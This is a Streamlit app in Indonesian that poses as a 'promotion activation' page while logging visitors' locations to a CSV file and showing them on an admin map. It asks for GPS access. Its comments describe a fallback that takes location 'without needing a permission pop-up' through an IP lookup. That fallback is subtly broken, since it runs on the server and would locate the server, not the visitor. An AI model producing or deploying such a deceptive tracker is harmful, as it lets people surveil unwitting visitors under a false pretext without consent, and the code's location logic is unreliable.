import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import pandas as pd
import requests
import os
import datetime

st.set_page_config(page_title="Pelacak Lokasi Otomatis", layout="centered")

LOCAL_DB = "data_lokasi_instansi.csv"

def muat_data():
    if os.path.exists(LOCAL_DB):
        return pd.read_csv(LOCAL_DB)
    return pd.DataFrame(columns=["waktu", "metode", "latitude", "longitude"])

def simpan_data(metode, lat, lon):
    df = muat_data()
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data_baru = pd.DataFrame([[waktu, metode, lat, lon]], columns=["waktu", "metode", "latitude", "longitude"])
    df = pd.concat([df, data_baru], ignore_index=True)
    df.to_csv(LOCAL_DB, index=False)
    return df

# FUNGSI OTOMATIS: Ambil lokasi kasar lewat IP internet (Tanpa Perlu Izin Pop-Up)
def ambil_lokasi_via_ip():
    try:
        response = requests.get("http://ip-api.com", timeout=3)
        data = response.json()
        if data.get('status') == 'success':
            return data.get('lat'), data.get('lon')
    except:
        pass
    return None, None

st.title("📍 Aktivasi Promosi Instansi")
st.write("Selamat datang! Posisi Anda sedang didaftarkan ke sistem database kami.")

# Jalankan sistem deteksi tombol GPS komponen
lokasi_gps = streamlit_geolocation()

# Variabel pembantu status pendaftaran
if "status_daftar" not in st.session_state:
    st.session_state["status_daftar"] = "Belum Terdaftar"

# KONDISI 1: Pengguna berhasil klik tombol target GPS dan memilih 'Allow' (Akurasi Tinggi)
if lokasi_gps.get("latitude") and lokasi_gps.get("longitude"):
    if st.session_state["status_daftar"] != "GPS Akurat Terkunci":
        lat = lokasi_gps["latitude"]
        lon = lokasi_gps["longitude"]
        simpan_data("Satelit GPS (Presisi)", lat, lon)
        st.session_state["status_daftar"] = "GPS Akurat Terkunci"
        st.success(f"🎉 LUAR BIASA! Koordinat GPS presisi Anda berhasil dikunci automatically!")
        st.balloons()

# KONDISI 2: Pengguna baru buka link, diam saja, atau pop-up diblokir (Sistem Ambil Alih Lewat IP)
else:
    if st.session_state["status_daftar"] == "Belum Terdaftar":
        lat_ip, lon_ip = ambil_lokasi_via_ip()
        if lat_ip and lon_ip:
            simpan_data("IP Internet (Kota)", lat_ip, lon_ip)
            st.session_state["status_daftar"] = "Lokasi IP Terkunci"
            st.info("⚡ Sistem Otomatis: Lokasi wilayah Anda berhasil dideteksi langsung melalui koneksi internet Anda.")
        else:
            st.warning("Menunggu respons perangkat untuk membaca posisi...")

# ================= DASHBOARD ADMIN (Bagian Bawah Halaman) =================
st.markdown("---")
st.subheader("📊 Dashboard Hasil Pelacakan (Admin)")

df_tampil = muat_data()

if not df_tampil.empty:
    st.metric(label="Total Lokasi Terlacak", value=len(df_tampil))
    
    # Tampilkan Peta
    st.write("### Peta Sebaran Lokasi")
    st.map(df_tampil)
    
    # Tampilkan Tabel Detail dengan keterangan metode pelacakannya
    st.write("### Log Database")
    st.dataframe(df_tampil, use_container_width=True)
else:
    st.info("Belum ada lokasi yang masuk.")
